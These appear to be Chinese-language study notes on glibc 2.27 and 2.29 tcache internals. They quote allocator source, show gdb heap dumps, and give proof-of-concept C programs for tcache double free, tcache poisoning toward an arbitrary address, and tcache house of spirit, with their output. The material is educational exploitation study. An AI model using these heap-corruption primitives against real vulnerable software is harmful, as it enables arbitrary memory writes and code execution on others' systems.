[TOC]
# glibc 2.27
## tcache 分配释放机制
贴上源码 在malloc.c 文件中
```
/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;

/* There is one of these for each thread, which contains the per-thread cache (hence "tcache_perthread_struct").  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```
 put tcache 和 get tcache 操作 ,类似于fastbin ，且不检查chunk结构
```
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

/* Caller must ensure that we know tc_idx is valid and there's
   available chunks to remove.  */
static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  assert (tcache->entries[tc_idx] > 0);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

```
for i in range(0,5):
        add(i,0x90)

add(6,0x20)

for i in range(0,5):
        delete(i)
```

得到
```
0x555555756000:	0x0000000000000000	0x0000000000000251
0x555555756010:	0x0000000000000005	0x0000000000000000
0x555555756020:	0x0000000000000000	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
0x555555756050:	0x0000555555757740	0x0000000000000000
0x555555756060:	0x0000000000000000	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x0000000000000000

```

执行以后
```
for i in range(0,5):
        add(i,0xe0)
```

```
0x555555756000:	0x0000000000000000	0x0000000000000251
0x555555756010:	0x0000000000000000	0x0000000000000000
0x555555756020:	0x0000000000000000	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
0x555555756050:	0x0000000000000000	0x0000000000000000
0x555555756060:	0x0000000000000000	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000000000000000	0x0000000000000000
```

Q&A 

tcache通过什么标准来索引?为什么可以从0x90空间里面分配到0xe0空间

```
  1 #include <stdio.h>
  2 #include <stdlib.h>
  3 
  4 int main(void){
  5         void * p[100];
  6         malloc(0x20);
  7         for ( int i = 0 ; i < 100; i++)
  8         {
  9                 p[i] = malloc(0x10 + i*0x10);
 10         }
 11         malloc(0x20);
 12         for ( int i = 0 ; i < 100 ; i++){
 13                 free(p[i]);
 14         }
 15         return 0;
 16 }

```

```
0x555555756000:	0x0000000000000000	0x0000000000000251
0x555555756010:	0x0101010101010101	0x0101010101010101
0x555555756020:	0x0101010101010101	0x0101010101010101
0x555555756030:	0x0101010101010101	0x0101010101010101
0x555555756040:	0x0101010101010101	0x0101010101010101
0x555555756050:	0x0000555555756290	0x00005555557562b0
0x555555756060:	0x00005555557562e0	0x0000555555756320
0x555555756070:	0x0000555555756370	0x00005555557563d0
0x555555756080:	0x0000555555756440	0x00005555557564c0
0x555555756090:	0x0000555555756550	0x00005555557565f0
0x5555557560a0:	0x00005555557566a0	0x0000555555756760
0x5555557560b0:	0x0000555555756830	0x0000555555756910
0x5555557560c0:	0x0000555555756a00	0x0000555555756b00
0x5555557560d0:	0x0000555555756c10	0x0000555555756d30
0x5555557560e0:	0x0000555555756e60	0x0000555555756fa0
0x5555557560f0:	0x00005555557570f0	0x0000555555757250
0x555555756100:	0x00005555557573c0	0x0000555555757540
0x555555756110:	0x00005555557576d0	0x0000555555757870
0x555555756120:	0x0000555555757a20	0x0000555555757be0
0x555555756130:	0x0000555555757db0	0x0000555555757f90
0x555555756140:	0x0000555555758180	0x0000555555758380
0x555555756150:	0x0000555555758590	0x00005555557587b0
0x555555756160:	0x00005555557589e0	0x0000555555758c20
0x555555756170:	0x0000555555758e70	0x00005555557590d0
0x555555756180:	0x0000555555759340	0x00005555557595c0
0x555555756190:	0x0000555555759850	0x0000555555759af0
0x5555557561a0:	0x0000555555759da0	0x000055555575a060
0x5555557561b0:	0x000055555575a330	0x000055555575a610
0x5555557561c0:	0x000055555575a900	0x000055555575ac00
0x5555557561d0:	0x000055555575af10	0x000055555575b230
0x5555557561e0:	0x000055555575b560	0x000055555575b8a0
0x5555557561f0:	0x000055555575bbf0	0x000055555575bf50
0x555555756200:	0x000055555575c2c0	0x000055555575c640
0x555555756210:	0x000055555575c9d0	0x000055555575cd70
0x555555756220:	0x000055555575d120	0x000055555575d4e0
0x555555756230:	0x000055555575d8b0	0x000055555575dc90
0x555555756240:	0x000055555575e080	0x000055555575e480
0x555555756250:	0x0000000000000000	0x0000000000000031

```

暴力解决索引问题
count 从10 到40 一共有64个，chunksize [0x20,0x410]

```
  1 #include <stdio.h>
  2 #include <stdlib.h>
  3 
  4 int main(void){
  5         void * p[100];
  6         malloc(0x20);
  7         void * p1 = malloc(0x90);
  8         malloc(0x20);
  9         free(p1);
 10 
 11         malloc(0xe0);
 12         return 0;
 13 }
```
0xe0 使用0x90 空间的问题就莫得了， 考虑可能是因为合并的原因
```
gdb-peda$ x /20gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000000000000251
0x555555756010:	0x0000000000000000	0x0000000000000001
0x555555756020:	0x0000000000000000	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
0x555555756050:	0x0000000000000000	0x0000000000000000
0x555555756060:	0x0000000000000000	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000555555756290	0x0000000000000000
gdb-peda$ p p1
$1 = (void *) 0x555555756290
gdb-peda$ x /20gx 0x555555756000+0x250
0x555555756250:	0x0000000000000000	0x0000000000000031
0x555555756260:	0x0000000000000000	0x0000000000000000
0x555555756270:	0x0000000000000000	0x0000000000000000
0x555555756280:	0x0000000000000000	0x00000000000000a1
0x555555756290:	0x0000000000000000	0x0000000000000000

gdb-peda$ x /20gx 0x555555756000+0x250+0x30+0xa0
0x555555756320:	0x0000000000000000	0x0000000000000031
0x555555756330:	0x0000000000000000	0x0000000000000000
0x555555756340:	0x0000000000000000	0x0000000000000000
0x555555756350:	0x0000000000000000	0x00000000000000f1
0x555555756360:	0x0000000000000000	0x0000000000000000
```

修改代码malloc 两块连续的堆块并释放。
```
#include <stdio.h>
#include <stdlib.h>

int main(void){
        void * p[100];
        malloc(0x20);
        void * p1 = malloc(0x90);
        void * p2 = malloc(0x90);
        malloc(0x20);
        free(p1);
        free(p2);
        malloc(0xe0);
        return 0;
}

```
依然没有这个问题
```
Legend: code, data, rodata, value
13	        return 0;
gdb-peda$ x /20gx 0x555555756000
0x555555756000:	0x0000000000000000	0x0000000000000251
0x555555756010:	0x0000000000000000	0x0000000000000002
0x555555756020:	0x0000000000000000	0x0000000000000000
0x555555756030:	0x0000000000000000	0x0000000000000000
0x555555756040:	0x0000000000000000	0x0000000000000000
0x555555756050:	0x0000000000000000	0x0000000000000000
0x555555756060:	0x0000000000000000	0x0000000000000000
0x555555756070:	0x0000000000000000	0x0000000000000000
0x555555756080:	0x0000000000000000	0x0000000000000000
0x555555756090:	0x0000555555756330	0x0000000000000000

```

## tcache poisoning

类似fastbin attack ， 修改tcache fd 指针 实现任意地址攻击，且不需要chunk 结构

## tcache dup

放入tcache的检验可以忽略不计。可以造成double free ， 和 tcache posoning 一起使用祸害无穷呀。
```
static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}
```
how2heap 源码
```
#include <stdio.h>
#include <stdlib.h>

int main()
{
        fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");

        fprintf(stderr, "Allocating buffer.\n");
        int *a = malloc(8);

        fprintf(stderr, "malloc(8): %p\n", a);
        fprintf(stderr, "Freeing twice...\n");
        free(a);
        free(a);

        fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
        fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n", malloc(8), malloc(8));

        return 0;
}

```
执行结果
```
This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x555555756260
Freeing twice...
Now the free list has [ 0x555555756260, 0x555555756260 ].
Next allocated buffers will be same: [ 0x555555756260, 0x555555756260 ].
```

和tcache poisoning结合, 修改how2heap源码
```
  1 #include <stdio.h>
  2 #include <stdlib.h>
  3 
  4 int main()
  5 {
  6         fprintf(stderr, "This file demonstrates a simple double-free attack with tcache.\n");
  7 
  8         fprintf(stderr, "Allocating buffer.\n");
  9         int *a = malloc(8);
 10 
 11         fprintf(stderr, "malloc(8): %p\n", a);
 12         fprintf(stderr, "Freeing twice...\n");
 13         free(a);
 14         free(a);
 15 
 16         fprintf(stderr, "Now the free list has [ %p, %p ].\n", a, a);
 17         void * p1 = malloc(8);
 18         *(unsigned long long *)p1 = 0x7ffff7dcfc30;
 19         fprintf(stderr, "Next allocated buffers will be same: [ %p, %p ].\n",p1, malloc(8));
 20         fprintf(stderr, "the Arbitrary address attack will be %p\n",malloc(8));
 21         return 0;
 22 }

```
执行结果
```
This file demonstrates a simple double-free attack with tcache.
Allocating buffer.
malloc(8): 0x555555756260
Freeing twice...
Now the free list has [ 0x555555756260, 0x555555756260 ].
Next allocated buffers will be same: [ 0x555555756260, 0x555555756260 ].
the Arbitrary address attack will be 0x7ffff7dcfc30
```

ctf wiki 上师傅实现了控制栈

```
#include <stdio.h>
#include <stdlib.h>

int main()
{
    fprintf(stderr, "This file demonstrates the house of spirit attack on tcache.\n");
    fprintf(stderr, "It works in a similar way to original house of spirit but you don't need to create fake chunk after the fake chunk that will be freed.\n");
    fprintf(stderr, "You can see this in malloc.c in function _int_free that tcache_put is called without checking if next chunk's size and prev_inuse are sane.\n");
    fprintf(stderr, "(Search for strings \"invalid next size\" and \"double free or corruption\")\n\n");

    fprintf(stderr, "Ok. Let's start with the example!.\n\n");


    fprintf(stderr, "Calling malloc() once so that it sets up its memory.\n");
    malloc(1);

    fprintf(stderr, "Let's imagine we will overwrite 1 pointer to point to a fake chunk region.\n");
    unsigned long long *a; //pointer that will be overwritten
    unsigned long long fake_chunks[10]; //fake chunk region

    fprintf(stderr, "This region contains one fake chunk. It's size field is placed at %p\n", &fake_chunks[1]);

    fprintf(stderr, "This chunk size has to be falling into the tcache category (chunk.size <= 0x410; malloc arg <= 0x408 on x64). The PREV_INUSE (lsb) bit is ignored by free for tcache chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.\n");
    fprintf(stderr, "... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. \n");
    fake_chunks[1] = 0x40; // this is the size


    fprintf(stderr, "Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
    fprintf(stderr, "... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.\n");

    a = &fake_chunks[2];

    fprintf(stderr, "Freeing the overwritten pointer.\n");
    free(a);

    fprintf(stderr, "Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
    fprintf(stderr, "malloc(0x30): %p\n", malloc(0x30));
}
```


## tcache 释放基地址
利用double free 和 连续三次malloc再free，将堆放入unsortedbin 获取libc

## tcache 控制堆分配

# glibc 2.29
源码
```

typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;


#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);
    if (tcache != NULL && tc_idx < mp_.tcache_bins)
      {
	/* Check to see if it's already in the tcache.  */
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	/* This test succeeds on double free.  However, we don't 100%
	   trust it (it also matches random payload data at a 1 in
	   2^<size_t> chance), so verify it's not an unlikely
	   coincidence before aborting.  */
	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    LIBC_PROBE (memory_tcache_double_free, 2, e, tc_idx);
	    for (tmp = tcache->entries[tc_idx];
		 tmp;
		 tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	    /* If we get here, it was a coincidence.  We've wasted a
	       few cycles, but don't abort.  */
	  }

	if (tcache->counts[tc_idx] < mp_.tcache_count)
	  {
	    tcache_put (p, tc_idx);
	    return;
	  }
      }
  }
```
源码解释
```
// _builtin_expect程序告诉编译器最有可能执行的分支
# define __glibc_unlikely(cond)	__builtin_expect ((cond), 0)

mp_ 是全局唯一的一个 malloc_par 实例，用于管理参数和统计信息
static struct malloc_par mp_ =
{
  .top_pad = DEFAULT_TOP_PAD,
  .n_mmaps_max = DEFAULT_MMAP_MAX,
  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,
  .trim_threshold = DEFAULT_TRIM_THRESHOLD,
#define NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))
  .arena_test = NARENAS_FROM_NCORES (1)
#if USE_TCACHE
  ,
  .tcache_count = TCACHE_FILL_COUNT,
  .tcache_bins = TCACHE_MAX_BINS,
  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS-1),
  .tcache_unsorted_limit = 0 /* No limit.  */
#endif
};

```
### Q&A
> LIBC_PROBE
> 这个后面值得研究，double 留下的内存的信息可能就是这个函数留下的
[相关连接](   https://sourceware.org/systemtap/wiki/UserSpaceProbeImplementation
)

仅检查了key 是否与当前值相同